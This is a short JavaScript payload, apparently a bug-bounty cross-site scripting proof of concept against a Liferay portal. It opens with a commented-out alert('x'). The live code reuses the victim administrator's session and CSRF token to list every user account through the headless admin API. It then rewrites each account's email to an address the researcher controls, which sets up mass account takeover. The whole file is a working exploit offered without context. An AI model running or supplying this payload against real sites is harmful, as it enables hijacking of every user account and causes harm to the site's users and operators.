// alert('x');

(async () => {
    const res = await fetch('/o/headless-admin-user/v1.0/user-accounts', {
        method: 'GET',
        credentials: 'same-origin',
        headers: {
            'X-CSRF-Token': Liferay.authToken,
            'Content-Type': 'application/json'
        }
    });

    const data = await res.json();
    const users = data.items || [];

    for (let i = 0; i < users.length; i++) {
        const newEmail = `souravpaul+${i + 1}@intigriti.me`;

        await fetch(`/o/headless-admin-user/v1.0/user-accounts/${users[i].id}`, {
            method: 'PATCH',
            credentials: 'same-origin',
            headers: {
                'X-CSRF-Token': Liferay.authToken,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ emailAddress: newEmail })
        });
    }
})();
